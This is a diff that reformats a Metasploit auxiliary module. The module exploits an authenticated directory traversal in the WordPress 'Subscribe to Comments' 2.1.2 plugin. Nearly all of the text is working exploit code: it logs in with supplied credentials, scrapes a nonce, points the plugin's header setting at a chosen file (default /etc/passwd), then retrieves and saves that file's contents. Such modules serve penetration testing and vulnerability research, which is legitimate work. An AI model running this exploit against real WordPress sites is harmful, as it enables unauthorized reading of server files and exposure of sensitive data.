@@ -9,33 +9,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress Subscribe Comments File Read Vulnerability',
-      'Description'    => %q{
-        This module exploits an authenticated directory traversal vulnerability
-        in WordPress Plugin "Subscribe to Comments" version 2.1.2, allowing
-        to read arbitrary files with the web server privileges.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Subscribe Comments File Read Vulnerability',
+        'Description' => %q{
+          This module exploits an authenticated directory traversal vulnerability
+          in WordPress Plugin "Subscribe to Comments" version 2.1.2, allowing
+          to read arbitrary files with the web server privileges.
+        },
+        'References' => [
           ['WPVDB', '8102'],
           ['PACKETSTORM', '132694'],
           ['URL', 'https://advisories.dxw.com/advisories/admin-only-local-file-inclusion-and-arbitrary-code-execution-in-subscribe-to-comments-2-1-2/']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Tom Adams <security[at]dxw.com>', # Vulnerability Discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
         OptString.new('WP_USER', [true, 'A valid username', nil]),
         OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
-      ])
+      ]
+    )
   end
 
   def user
@@ -52,10 +54,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_nonce(cookie)
     res = send_request_cgi(
-      'uri'    => normalize_uri(wordpress_url_backend, 'options-general.php'),
+      'uri' => normalize_uri(wordpress_url_backend, 'options-general.php'),
       'method' => 'GET',
-      'vars_get'  => {
-        'page'    => 'stc-options'
+      'vars_get' => {
+        'page' => 'stc-options'
       },
       'cookie' => cookie
     )
@@ -64,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
       location = res.redirection
       print_status("Following redirect to #{location}")
       res = send_request_cgi(
-        'uri'    => location,
+        'uri' => location,
         'method' => 'GET',
         'cookie' => cookie
       )
@@ -73,6 +75,7 @@ class MetasploitModule < Msf::Auxiliary
     if res && res.body && res.body =~ /id="_wpnonce" name="_wpnonce" value="([a-z0-9]+)" /
       return Regexp.last_match[1]
     end
+
     nil
   end
 
@@ -81,10 +84,10 @@ class MetasploitModule < Msf::Auxiliary
     filename = filename[1, filename.length] if filename =~ %r{/^///}
 
     res = send_request_cgi(
-      'method'    => 'POST',
-      'uri'       => normalize_uri(wordpress_url_backend, 'options-general.php'),
-      'vars_get'  => {
-        'page'    => 'stc-options'
+      'method' => 'POST',
+      'uri' => normalize_uri(wordpress_url_backend, 'options-general.php'),
+      'vars_get' => {
+        'page' => 'stc-options'
       },
       'vars_post' => {
         'sg_subscribe_settings[name]' => '',
@@ -94,21 +97,22 @@ class MetasploitModule < Msf::Auxiliary
         'sg_subscribe_settings[subscribed_text]' => 'teste',
         'sg_subscribe_settings[author_text]' => '',
         'sg_subscribe_settings[use_custom_style]' => 'use_custom_style',
-        'sg_subscribe_settings[header]' => "#{filename}",
+        'sg_subscribe_settings[header]' => filename.to_s,
         'sg_subscribe_settings[sidebar]' => '',
         'sg_subscribe_settings[footer]' => '',
         'sg_subscribe_settings[before_manager]' => '',
         'sg_subscribe_settings[after_manager]' => '',
         'sg_subscribe_settings_submit' => 'Update Options',
-        '_wpnonce' => "#{nonce}",
+        '_wpnonce' => nonce.to_s,
         '_wp_http_referer' => '/wp-admin/options-general.php?page=stc-options'
       },
-      'cookie'    => cookie
+      'cookie' => cookie
     )
 
-    if res && res.code == 200 && res.body.include?("<p><strong>Options saved.</strong>")
+    if res && res.code == 200 && res.body.include?('<p><strong>Options saved.</strong>')
       return res.body
     end
+
     nil
   end
 
@@ -121,36 +125,36 @@ class MetasploitModule < Msf::Auxiliary
     end
     store_valid_credential(user: user, private: password, proof: cookie)
 
-    vprint_status("Trying to get nonce...")
+    vprint_status('Trying to get nonce...')
     nonce = get_nonce(cookie)
     if nonce.nil?
-      print_error("Can not get nonce after login")
+      print_error('Can not get nonce after login')
       return
     end
     vprint_status("Got nonce: #{nonce}")
 
-    vprint_status("Trying to download filepath.")
+    vprint_status('Trying to download filepath.')
     file_path = down_file(cookie, nonce)
     if file_path.nil?
-      print_error("Error downloading filepath.")
+      print_error('Error downloading filepath.')
       return
     end
 
     res = send_request_cgi(
-      'method'    => 'GET',
-      'uri'       => normalize_uri(target_uri.path),
-      'vars_get'  => {
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path),
+      'vars_get' => {
         'wp-subscription-manager' => '1'
       },
-      'cookie'    => cookie
+      'cookie' => cookie
     )
 
     if res && res.code == 200 &&
-        res.body.length > 830 &&
-        res.body.include?(">Find Subscriptions</") &&
-        res.headers['Content-Length'].to_i > 830
+       res.body.length > 830 &&
+       res.body.include?('>Find Subscriptions</') &&
+       res.headers['Content-Length'].to_i > 830
 
-      res_clean = res.body.gsub(/\t/, '').gsub(/\r\n/, '').gsub(/<.*$/, "")
+      res_clean = res.body.gsub(/\t/, '').gsub(/\r\n/, '').gsub(/<.*$/, '')
 
       vprint_line("\n#{res_clean}")
       fname = datastore['FILEPATH']
@@ -164,7 +168,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_good("File saved in: #{path}")
     else
-      print_error("Nothing was downloaded. You can try to change the FILEPATH.")
+      print_error('Nothing was downloaded. You can try to change the FILEPATH.')
     end
   end
 end
